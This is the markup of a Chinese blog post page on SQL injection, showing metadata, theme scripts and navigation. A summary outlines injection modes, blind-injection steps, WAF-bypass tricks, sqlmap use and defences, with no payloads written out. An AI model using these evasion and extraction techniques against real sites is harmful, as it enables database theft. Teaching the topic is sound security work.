<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>SQL注入 | 渊</title><meta name="keywords" content="天若有情天亦老 大道无情情至公"><meta name="author" content="渊"><meta name="copyright" content="渊"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="SQL注入"><meta name="application-name" content="SQL注入"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="SQL注入"><meta property="og:url" content="http://example.com/2024/04/23/hw/SQL注入/index.html"><meta property="og:site_name" content="渊"><meta property="og:description" content="A.SQL注入SQL注入危害以及本质：这些危害包括但不局限于  数据库信息泄漏:数据库中存放的用户的隐私信息的泄露。 网页篡改:通过操作数据库对特定网页进行篡改。 网站被挂马，传播恶意软件:修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。 数据库被恶意操作:数据库服务器被攻击，数据库的系统管理员"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="http://example.com/img/default_cover.jpg"><meta property="article:author" content="渊"><meta property="article:tag" content="天若有情天亦老 大道无情情至公"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="http://example.com/img/default_cover.jpg"><meta name="description" content="A.SQL注入SQL注入危害以及本质：这些危害包括但不局限于  数据库信息泄漏:数据库中存放的用户的隐私信息的泄露。 网页篡改:通过操作数据库对特定网页进行篡改。 网站被挂马，传播恶意软件:修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。 数据库被恶意操作:数据库服务器被攻击，数据库的系统管理员"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://example.com/2024/04/23/hw/SQL%E6%B3%A8%E5%85%A5/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/swiper/swiper.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: undefined,
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: undefined,
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: {"mode":"api","api":"https://img2color-go.vercel.app/api?img=","cover_change":true},
  authorStatus: {"skills":["🤖️ 数码科技爱好者","🔍 分享与热心帮助","🏠 智能家居小能手","🔨 设计开发一条龙","🤝 专修交互与设计","🏃 脚踏实地行动派","🧱 团队小组发动机","💢 壮汉人狠话不多"]},
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":10,"position":"top","messagePrev":"距离上次更新已经","messageNext":"天了，文章的内容可能已经过时了。"},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    simplehomepage: true,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: 渊","link":"链接: ","source":"来源: 渊","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: {"enable":true,"delay":100,"shiftDelay":200},
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: '渊',
  title: 'SQL注入',
  postAI: '',
  pageFillDescription: 'A.SQL注入, SQL注入危害以及本质：, SQL注入的分类, SQL注入的一般步骤, B.MySQL之SQL注入版, MySQL中的三种注释风格：, MySQL中的内联注释：, union联合查询, order by语句, information_schema的结构, 注释在SQL注入中的应用：, SQL注入中一些常用的MySQL函数x2F语句：, SQL注入读写文件的根本条件：, load file()读文件        into outfile x2Finto dumpfile写文件, 字符串连接函数, C.SQL注入实战演练, 基于联合查询的注入模式, 判断是否存在注入与求闭合字段, 求显示位, 求表名, 求列名, 求字段内容, 基于报错的注入模式, updatexml函数, 求库名, 求表名, 求列名, Floor(), 十五种报错函数, 布尔型盲注, 盲注一般步骤, 求数据库长度, 求数据库名的ascii值, 求表的数量, 求表名的长度, 求表名的ascii值, 求列的数量, 求列名的长度, 求列名对应的ascii值, 求字段的数量, 求字段内容的长度, 求字段内容对应的ascii值, 时间型盲注, WAF绕过之道, D.SQL注入工具使用, E.SQL注入防御措施注入注入危害以及本质这些危害包括但不局限于数据库信息泄漏数据库中存放的用户的隐私信息的泄露网页篡改通过操作数据库对特定网页进行篡改网站被挂马传播恶意软件修改数据库一些字段的值嵌入网马链接进行挂马攻击数据库被恶意操作数据库服务器被攻击数据库的系统管理员帐户被窜改服务器被远程控制被安装后门经由数据库服务器提供的操作系统支持让黑客得以修改或控制操作系统破坏硬盘数据瘫痪全系统本质把用户输入的数据当作代码执行包含两个关键条件一用户能够控制输入二原本程序要执行的代码拼接了用户输入的数据变量的值由用户提交在正常情况下假如用户输入的是那么语句会执行但是假如用户输入一段有语义的语句比如那么语句在实际的执行时就会如下条件一用户能够控制变量条件二原本要执行的代码拼接了用户的输入注入经常出没的地方简言之一切可以与数据库进行交互的地方注入的分类根据数据的传输方式类型类型类型根据数据的类型数字型字符型根据注入的模式基于联合查询的注入模式基于报错的注入模式基于布尔的盲注基于时间的盲注推查询的注入模式注入的一般步骤求闭合字符选择注入模式爆数据库爆表名爆列名爆字段之注入版中的三种注释风格中的内联注释内联注释是数据库为了保持与其他数据库兼容特意新添加的功能为了避免从中导出的语句不能被其他数据库使用它把一些特有的语句放在中这些语句在不兼容的数据库中使用时便不会执行而自身却能识别执行表示数据库版本时中间的语句才会执行在注入中内联注释常用来绕过联合查询操作符用于拼接两个或者多查询语句中的每个查询必须拥有相同的列数语句语句用于根据指定的列对结果集进行排序语句默认按照升序对记录进行排序的结构注释在注入中的应用攻击者注入一段包含注释符的语句将原来的语句的一部分注释注释掉的部分语句不会被执行注入中一些常用的函数语句注入读写文件的根本条件数据库允许导入导出当前用户用户文件操作权限直接在文件里面设置即可读文件写文件条件对目录具有读写权限知道文件绝对路径能够使用联合查询注入时与的区别适用于二进制文件它会将目标文件写入同一行内则更适用于文本文件命令字符串连接函数函数直接连接函数使用逗号做为分隔符函数使用第一个参数做为分隔符注入实战演练基于联合查询的注入模式基于联合查询的注入一般步骤求闭合字符求列数求显示位爆数据库名爆表名爆列名爆字段名当然不管何种注入模式在最开始都要先判断是否存在注入判断是否存在注入与求闭合字段异常正确错误结论极有可能存在数字型注入单引号有个特殊的作用命令分隔符异常正确错误结论极有可能存在单引号字符型注入异常正确错误结论极有可能存在双引号字符型注入异常正确错误结论极有可能存在括号数字型注入异常问此时后面加什么闭合字符页面才会正常异常问此时后面加什么闭合字符页面才会正常求列数正常异常表示按第几列来排序超出查询数据的列数会报错有的地方会说判断出来的是当前表的列数很不严谨应该说是查询了几列按第几列来排序求显示位求显示位的原因因为尽管查询了四列但是却只用了两列即只显示了两列我们要求出到底用了哪两列然后在所用的列上插入我们的切记要在回显的位置插入求表名求列名求字段内容基于报错的注入模式基于报错的注入一般步骤求闭合字符爆数据库名爆表名爆列名爆字段名页面有报错信息时优先选择基于报错的注入模式函数第一个参数是格式为文档对象的名称文中为第二个参数格式的字符串如果不了解语法可以在网上查找教程第三个参数格式替换查找到的符合条件的数据作用改变文档中符合条件的节点的值改变中符合的值而我们的注入语句为其中的函数是将其连成一个字符串因此不会符合的格式从而出现格式错误爆出求库名求表名求列名先来解释一下与是如何共同工作的首先系统会建立一个虚拟表假设有一个表执行的过程中会形成这样的虚拟表由于的是第一次读取的就是在虚拟表中寻找是否已经存在由于表是空的直接插入一条新数据这时虚拟表变成下图这样下一个是由于虚拟表中依旧没有为的字段故插入再下一个是继续插入再下一个又是由于已经有了故将为的字段的的值加变为了剩下的以此类推最后形成了这个虚拟表先来回顾下总体是一个语句只不过这里的是这是一个表达式每次运算的值都是随机的的值序列开头是下面开始运算首先建立一张虚拟表接着进行表达式第一次运算的值为在表中没有找到为的数据故插入在插入的过程中需要再取一次后面的值即再进行一次运算结果为取到了将之插入并将置再进行进行表达式运算由于这是第三次运算了故值为刚好表中有了为的数据故直接将其对应的加即可继续进行这是第四次运算了根据刚刚那个序列这次的值为在表中找是否有为的数据当然没有故应当插入一条新记录在插入时进行运算就像第一次那样这时的值为并将置可是你会说虚拟表中已经有了为的数据了啊对这就是问题所在了此时就会抛出主键冗余的异常也就是所谓的报错十五种报错函数强烈建议在查询语句后面添加一个标识符如因为有的时候报错信息会设置长度限制添加标识符可以避免显示不完全布尔型盲注特点页面存在异常但是即无回显也无报错信息利用只能通过正确与错误两种状态来判断是否正确计算结果集的行数返回指定字符串的长度里面放一个字符串如果放置表达式的话需要用括号括起来返回截取的子字符串返回指定字符串最左侧字符的值布尔型盲注核心思想利用判断语句来证明推测是否正确推测正确时页面正常显示错误时页面异常盲注一般步骤求闭合字符求当前数据库名的长度求当前数据库名对应的值求表的数量求表名的长度求表名对应的值求列的数量求列名的长度求列名对应的值求字段的数量求字段内容的长度求字段内容对应的值求数据库长度求数据库名的值求表的数量求表名的长度求表名的值求列的数量求列名的长度求列名对应的值求字段的数量求字段内容的长度求字段内容对应的值时间型盲注特点页面不存在异常且即无回显也无报错信息利用只能利用条件语句结合执行时间的长短来判断是否正确如果是则执行否则执行将程序暂停秒时间型盲注核心思想即正确时程序暂停秒否则立刻执行即正确时程序立刻执行否则暂停秒绕过之道常见姿势大小写混合多重关键字编码注释等价函数或命令特殊符号组合绕过大小写混合原因服务器端检测时未开启大小写不敏感形式多重关键字原因服务器端检测到敏感字符时替换为空形式编码原因服务器端未检测或检测不严具有编码形式的关键字类型十六进制编码编码编码形式注释原因服务器端未检测或检测不严注释内的字符串形式等等价函数或命令原因服务器端黑名单不完整过滤不严形式查询字符串截取函数字符串连接函数字符串转换替换逗号替换等号特殊符号原因数据库中效果相同服务器端却没有限制形式科学记数法空白字符反单引号括号组合绕过原因服务器端检测多处位置需要多重绕过方式组合使用形式注入工具使用穿山甲啊胡萝卜常用命令显示基体帮助信息显示高级帮助信息检测诗人存在注入求所有数据库求当前数据库求指定数据库所有表名求指定数据库指定表的所有列名求指定数据库指定表名指定字段的内容注入防御措施使用参数化查询输入检查白名单检查判断参数数据类型如的值判断是否为整形黑名单检查使用正则禁止敏感字符和字符串的使用使用安全函数最小权限原则',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-04-23 01:02:38',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://index.anheyu.com/" title="个人主页"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/13/64d8c2748ef34.jpg" alt="个人主页"/><span class="back-menu-item-text">个人主页</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://updateyuan.github.io/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">渊</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a><div id="he-plugin-simple"></div><script>var WIDGET = {
  "CONFIG": {
    "modules": "0124",
    "background": "2",
    "tmpColor": "FFFFFF",
    "tmpSize": "16",
    "cityColor": "FFFFFF",
    "citySize": "16",
    "aqiColor": "E8D87B",
    "aqiSize": "16",
    "weatherIconSize": "24",
    "alertIconSize": "18",
    "padding": "10px 10px 10px 10px",
    "shadow": "0",
    "language": "auto",
    "borderRadius": "20",
    "fixed": "true",
    "vertical": "top",
    "horizontal": "left",
    "left": "20",
    "top": "7.1",
    "key": "df245676fb434a0691ead1c63341cd94"
  }
}
</script><link rel="stylesheet" href="https://widget.qweather.net/simple/static/css/he-simple.css?v=1.4.0"/><script src="https://widget.qweather.net/simple/static/js/he-simple.js?v=1.4.0"></script></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/equipment/"><i class="anzhiyufont anzhiyu-icon-dice-d20 faa-tada" style="font-size: 0.9em;"></i><span> 我的装备</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="/img/reward/wx.jpg" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/reward/wx.jpg"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/reward/zfb.jpg" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/reward/zfb.jpg"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/Anaconda/" style="font-size: 1.05rem;">Anaconda<sup>10</sup></a><a href="/tags/Android/" style="font-size: 1.05rem;">Android<sup>2</sup></a><a href="/tags/C%E8%AF%AD%E8%A8%80/" style="font-size: 1.05rem;">C语言<sup>1</sup></a><a href="/tags/FAT32%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/" style="font-size: 1.05rem;">FAT32文件系统<sup>2</sup></a><a href="/tags/HCIP/" style="font-size: 1.05rem;">HCIP<sup>2</sup></a><a href="/tags/JAVA%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/" style="font-size: 1.05rem;">JAVA程序设计<sup>3</sup></a><a href="/tags/Linux/" style="font-size: 1.05rem;">Linux<sup>5</sup></a><a href="/tags/MacOS/" style="font-size: 1.05rem;">MacOS<sup>1</sup></a><a href="/tags/Python/" style="font-size: 1.05rem;">Python<sup>2</sup></a><a href="/tags/SQL/" style="font-size: 1.05rem;">SQL<sup>3</sup></a><a href="/tags/VMware-Workstation/" style="font-size: 1.05rem;">VMware-Workstation<sup>1</sup></a><a href="/tags/Web/" style="font-size: 1.05rem;">Web<sup>1</sup></a><a href="/tags/Windows/" style="font-size: 1.05rem;">Windows<sup>1</sup></a><a href="/tags/Winhex/" style="font-size: 1.05rem;">Winhex<sup>7</sup></a><a href="/tags/hexo/" style="font-size: 1.05rem;">hexo<sup>13</sup></a><a href="/tags/python/" style="font-size: 1.05rem;">python<sup>10</sup></a><a href="/tags/%E4%B8%93%E5%8D%87%E6%9C%AC/" style="font-size: 1.05rem;">专升本<sup>1</sup></a><a href="/tags/%E5%8A%9E%E5%85%AC%E8%87%AA%E5%8A%A8%E5%8C%96/" style="font-size: 1.05rem;">办公自动化<sup>1</sup></a><a href="/tags/%E5%8D%8E%E4%B8%BA/" style="font-size: 1.05rem;">华为<sup>2</sup></a><a href="/tags/%E5%8D%8E%E4%B8%BA1-X/" style="font-size: 1.05rem;">华为1+X<sup>8</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">基础<sup>5</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/" style="font-size: 1.05rem;">基础教程<sup>33</sup></a><a href="/tags/%E5%A4%A7%E5%AD%A6/" style="font-size: 1.05rem;">大学<sup>3</sup></a><a href="/tags/%E5%B1%80%E5%9F%9F%E7%BD%91%E7%BB%84%E5%BB%BA%E4%B8%8E%E7%BB%B4%E6%8A%A4/" style="font-size: 1.05rem;">局域网组建与维护<sup>2</sup></a><a href="/tags/%E5%BA%94%E7%94%A8%E5%AF%86%E7%A0%81%E6%8A%80%E6%9C%AF/" style="font-size: 1.05rem;">应用密码技术<sup>3</sup></a><a href="/tags/%E6%80%9D%E7%A7%91/" style="font-size: 1.05rem;">思科<sup>2</sup></a><a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" style="font-size: 1.05rem;">操作系统<sup>1</sup></a><a href="/tags/%E6%95%B0%E5%AD%A6/" style="font-size: 1.05rem;">数学<sup>1</sup></a><a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 1.05rem;">数据库<sup>2</sup></a><a href="/tags/%E6%95%B0%E6%8D%AE%E6%81%A2%E5%A4%8D/" style="font-size: 1.05rem;">数据恢复<sup>13</sup></a><a href="/tags/%E6%9B%B4%E6%96%B0/" style="font-size: 1.05rem;">更新<sup>13</sup></a><a href="/tags/%E6%9D%82%E8%AE%B0/" style="font-size: 1.05rem;">杂记<sup>1</sup></a><a href="/tags/%E7%88%AC%E8%99%AB/" style="font-size: 1.05rem;">爬虫<sup>10</sup></a><a href="/tags/%E7%A1%AC%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%B8%88/" style="font-size: 1.05rem;">硬件工程师<sup>1</sup></a><a href="/tags/%E7%BD%91%E7%BB%9C/" style="font-size: 1.05rem;">网络<sup>4</sup></a><a href="/tags/%E7%BE%8E%E5%8C%96/" style="font-size: 1.05rem;">美化<sup>13</sup></a><a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">计算机基础<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">6</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/03/"><span class="card-archive-list-date">三月 2022</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/02/"><span class="card-archive-list-date">二月 2022</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/01/"><span class="card-archive-list-date">一月 2022</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/12/"><span class="card-archive-list-date">十二月 2021</span><div class="card-archive-list-count-group"><span 